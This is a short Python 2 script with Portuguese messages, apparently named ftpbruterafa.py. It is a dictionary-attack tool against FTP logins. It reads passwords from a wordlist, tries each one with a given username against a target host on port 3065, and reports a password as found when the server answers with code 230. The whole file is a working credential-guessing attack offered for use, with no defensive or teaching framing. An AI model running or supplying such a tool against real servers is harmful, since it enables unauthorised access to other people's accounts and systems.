#!/usr/bin/python

import socket
import re
import sys

if len(sys.argv) <2:
        print "Use python ftpbruterafa.py seu alvo  usuario"
        sys.exit(0)

usuario = sys.argv[2]

file = open("lista.txt")
for linha in file.readlines():

       print "Testando com %s:%s "%(usuario,linha)
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       s.connect((sys.argv[1],3065))
       s.recv(1024)
       s.send("USER "+usuario+"\r\n")
       s.recv(1024)
       s.send("PASS "+linha+"\r\n")
       resulta = s.recv(1024)
       s.send("QUIT\r\n")
    
       if re.search("230",resulta):
              print "[+] ===> senha encontrada <=== %s [+]"%(linha)
              break 
       else:
              print "[-] Acesso negado [-]\n"
      
